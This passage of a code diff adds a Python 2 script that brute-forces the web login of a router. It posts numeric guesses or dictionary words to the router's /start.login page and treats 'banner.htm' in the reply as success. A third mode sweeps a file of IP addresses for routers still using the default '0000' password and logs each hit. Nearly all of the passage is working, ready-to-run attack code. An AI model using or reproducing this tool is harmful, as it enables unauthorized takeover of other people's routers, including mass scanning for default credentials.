+	print MSG+" / By: "+AUTHOR+" / Version: "+VERSION
+	print "Trying brute force on "+str(IP)+" port "+str(PORT)+" with option: "+str(OPT)
+	print "Logging is: "+str(LOGGING)+"\n"
+
+	# if not port 80 or 443
+	if int(PORT) != 443 and int(PORT) != 80:
+		print "Port must be 443 ( SSL ) or 80 ( HTTP ). Exit."
+		exit()
+
+	# do we wanna log ?
+	if LOGGING == "ON":
+		# open logfile an write
+		file=open(LOGFILE, "a")
+		file.write("Begin logging: "+str(asctime())+"\n")
+		file.write("Router: "+str(IP)+"\n")
+		file.write("Port: "+str(PORT)+"\n")
+		file.write("Option: "+str(OPT)+"\n")
+
+	# if we wanna brute force with numbers
+	if OPT == "-n":
+		print "Trying passwords: "
+		# create range - PW length is 4 on the router
+		for x in range(0, int(IN)+1):
+#		for x in range(1000, int(IN)+1001):
+			print str(x)
+			# test for HTTP / HTTPS
+			if int(PORT) == 80:
+				# try to connect to IP with 80 / HTTP
+				try:
+					con = httplib.HTTPConnection(str(IP)+":"+str(PORT))
+				except:
+					print "Failed to connect. Exit."
+					exit()
+				# make POST /start.login and try password
+				try:
+					PARAMS = urllib.urlencode({'P1': int(x)})
+					con.request("POST", "/start.login", PARAMS, HEADER)
+				except:
+					print "Failed to send request."
+					exit()
+
+				# get data
+				response = con.getresponse()
+				data = response.read()
+
+				# is there the sign we had success ( the word banner )
+				if "banner.htm" in data:
+					print "\nFOUND PASSWORD. Password is: "+str(x)+" . Exit.\n"
+					# write logging
+					if LOGGING == "ON":
+						file.write("Password is: "+str(x)+"\n\n")
+						file.close()
+					exit()
+
+			# HTTPS / SSL
+			if int(PORT) == 443:
+				# try to connect to IP with 443 / SSL
+				try:
+					con = httplib.HTTPSConnection(str(IP)+":"+str(PORT))
+				except:
+					print "Failed to connect. Exit."
+					exit()
+				# make POST /start.login and try password
+				try:
+					PARAMS = urllib.urlencode({'P1': int(x)})
+					con.request("POST", "/start.login", PARAMS, HEADER)
+				except:
+					print "Failed to send request."
+					exit()
+
+				# get data
+				response = con.getresponse()
+				data = response.read()
+
+				# is there the sign we had success ( the word banner )
+				if "banner.htm" in data:
+					print "\nFOUND PASSWORD. Password is: "+str(x)+" . Exit.\n"
+					# write logging
+					if LOGGING == "ON":
+						file.write("Password is: "+str(x)+"\n\n")
+						file.close()
+					exit()
+
+		print "\nPassword NOT found. Exit.\n"
+		# close file
+		if LOGGING == "ON":
+			# close logfile
+			file.write("Password NOT found.\n\n")
+			file.close()
+			exit()
+
+	# if we wanna brute force with a password file / dictionary
+	if OPT == "-d":
+		print "Trying passwords: "
+		# open file in read only mode
+		try:
+			pwfile=open(IN, "r")
+		except:
+			print "Cant open PW file. Exit."
+			exit()
+
+		# try every password
+		for x in pwfile.readlines():
+
+			print str(x[:-1])
+			# test for HTTP / HTTPS
+			if int(PORT) == 80:
+				# try to connect to IP with 80 / HTTP
+				try:
+					con = httplib.HTTPConnection(str(IP)+":"+str(PORT))
+				except:
+					print "Failed to connect. Exit."
+					exit()
+				# make POST /start.login and try password
+				try:
+					PARAMS = urllib.urlencode({'P1': str(x[:-1])})
+					con.request("POST", "/start.login", PARAMS, HEADER)
+				except:
+					print "Failed to send request."
+					exit()
+
+				# get data
+				response = con.getresponse()
+				data = response.read()
+
+				# is there the sign we had success ( the word banner )
+				if "banner.htm" in data:
+					print "\nFOUND PASSWORD. Password is: "+str(x[:-1])+" . Exit.\n"
+					# write logging
+					if LOGGING == "ON":
+						file.write("Password is: "+str(x[:-1])+"\n\n")
+						file.close()
+					exit()
+
+			# HTTPS / SSL
+			if int(PORT) == 443:
+				# try to connect to IP with 443 / SSL
+				try:
+					con = httplib.HTTPSConnection(str(IP)+":"+str(PORT))
+				except:
+					print "Failed to connect. Exit."
+					exit()
+				# make POST /start.login and try password
+				try:
+					PARAMS = urllib.urlencode({'P1': str(x[:-1])})
+					con.request("POST", "/start.login", PARAMS, HEADER)
+				except:
+					print "Failed to send request."
+					exit()
+
+				# get data
+				response = con.getresponse()
+				data = response.read()
+
+				# is there the sign we had success ( the word banner )
+				if "banner.htm" in data:
+					print "\nFOUND PASSWORD. Password is: "+str(x[:-1])+" . Exit.\n"
+					# write logging
+					if LOGGING == "ON":
+						file.write("Password is: "+str(x[:-1])+"\n\n")
+						file.close()
+					exit()
+
+		print "\nPassword NOT found. Exit.\n"
+		# close file
+		if LOGGING == "ON":
+			# close logfile
+			file.write("Password NOT found.\n\n")
+			file.close()
+			exit()
+
+	# test an IP range from a textfile for the weak "0000" password
+	if OPT == "-r":
+		print "Trying weak password at router: "
+		# open file in read only mode
+		try:
+			ips=open(IN, "r")
+		except:
+			print "Cant open IP range file. Exit."
+			exit()
+
+		# try every password
+		for x in ips.readlines():
+
+			print str(x[:-1])
+			# test for HTTP / HTTPS
+			if int(PORT) == 80:
+				# try to connect to IP with 80 / HTTP
+				try:
+					con = httplib.HTTPConnection(str(x[:-1])+":"+str(PORT))
+				except:
+					print "Failed to connect. Exit."
+					continue
+				# make POST /start.login and try 0000 password
+				try:
+					PARAMS = urllib.urlencode({'P1': str(PW)})
+					con.request("POST", "/start.login", PARAMS, HEADER)
+				except:
+					print "Failed to send request."
+					continue
+
+				# get data
+				response = con.getresponse()
+				data = response.read()
+
+				# is there the sign we had success ( the word banner )
+				if "banner.htm" in data:
+					print "\nFOUND PASSWORD. Password is: "+str(PW)+" .\n"
+					# write logging
+					if LOGGING == "ON":
+						file.write(str(x[:-1])+" Password is: "+str(PW)+"\n")
+					continue
+
+			# HTTPS / SSL
+			if int(PORT) == 443:
+				# try to connect to IP with 443 / SSL
+				try:
+					con = httplib.HTTPSConnection(str(x[:-1])+":"+str(PORT))
+				except:
+					print "Failed to connect. Exit."
+					continue
+				# make POST /start.login and try password
+				try:
+					PARAMS = urllib.urlencode({'P1': str(PW)})
+					con.request("POST", "/start.login", PARAMS, HEADER)
+				except:
+					print "Failed to send request."
+					continue
+
+				# get data
+				response = con.getresponse()
+				data = response.read()
+
+				# is there the sign we had success ( the word banner )
+				if "banner.htm" in data:
+					print "\nFOUND PASSWORD. Password is: "+str(PW)+" .\n"
+					# write logging
+					if LOGGING == "ON":
+						file.write(str(x[:-1])+" Password is: "+str(PW)+"\n")
+					continue
+
+		print "\nEnd of scan. Exit.\n"
+		# close file
+		if LOGGING == "ON":
+			# close logfile
+			file.write("End of scan.\n\n")
+			file.close()
+			exit()
+
+# print help if not enough arguments
+if len(argv) < 5:
+        info()
+        # exit
+        exit()
+else:
+	# make IP and so on
+	global IP, PORT, OPT, IN
+	IP = argv[1]
+	PORT = argv[2]
+	OPT = argv[3]
+        IN = argv[4]
+	bf()
+
+# if -h given then print the help screen
+if argv[1] == "-h":
+        info()
+        # exit
+        exit()
+
+# EOF
+
+
+
+[EOF]
+
